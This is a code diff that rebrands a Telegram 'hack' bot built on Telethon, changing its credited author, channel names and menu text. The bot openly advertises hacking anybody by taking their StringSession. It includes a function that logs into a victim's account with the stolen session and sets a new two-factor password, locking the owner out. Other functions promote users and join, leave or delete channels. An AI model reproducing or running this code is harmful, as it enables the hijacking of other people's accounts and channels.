@@ -1,4 +1,6 @@
-# By Manish Ranjan 
+
+# COPYRIGHT © 2021-22 BY LEGENDX22 🔥
+# NOW PUBLIC BY LEGENDX
 import os
 os.system("pip install Telethon==1.21.1")
 from telethon import TelegramClient, events, functions, types
@@ -8,7 +10,7 @@ from os import system
 from telethon.tl.types import ChannelParticipantsAdmins, ChannelParticipantAdmin, ChannelParticipantCreator
 api_hash = os.environ.get("API_HASH")
 token = os.environ.get("BOT_TOKEN")
-client = TelegramClient('Manish Ranjan', api_id, api_hash).start(bot_token=token)
+client = TelegramClient('Xarmy', api_id, api_hash).start(bot_token=token)
 from telethon import TelegramClient as tg
 from telethon.tl.functions.channels import GetAdminedPublicChannelsRequest as pc, JoinChannelRequest as join, LeaveChannelRequest as leave, DeleteChannelRequest as dc
 from telethon.sessions import StringSession as ses
@@ -73,7 +75,7 @@ async def promote(strses, grp, user):
 async def user2fa(strses):
   async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
     try:
-      await X.edit_2fa('Manish is best')
+      await X.edit_2fa('LEGENDXISBEST')
       return True
     except:
       return False
@@ -145,10 +147,10 @@ async def userchannels(strses):
 import logging
 logging.basicConfig(level=logging.WARNING)
 
-channel = "TechConsole"
+channel = "TheXArmy"
 menu = '''
 
-**NOTICE JOIN @TechConsole**
+**NOTICE JOIN @TheXArmy FEDERATION**
 FED ID `2936f6a8-cc1d-4f76-ac1f-ac752fe5caef`
 
 
@@ -185,19 +187,6 @@ You can hack anybody
 Take his StringSession and use me
 I will give you full power of mine
 Type /hack
-
-
-    
-'''
-buttons = [
-    [
-        InlineKeyboardButton(
-            text="Updates", url="https://t.me/missdarknews"
-        ),
-        InlineKeyboardButton(
-            text="Support", url="https://t.me/missdarkChat"
-        ),
-    ],
 '''
 @client.on(events.NewMessage(pattern="/start"))
 async def op(event):
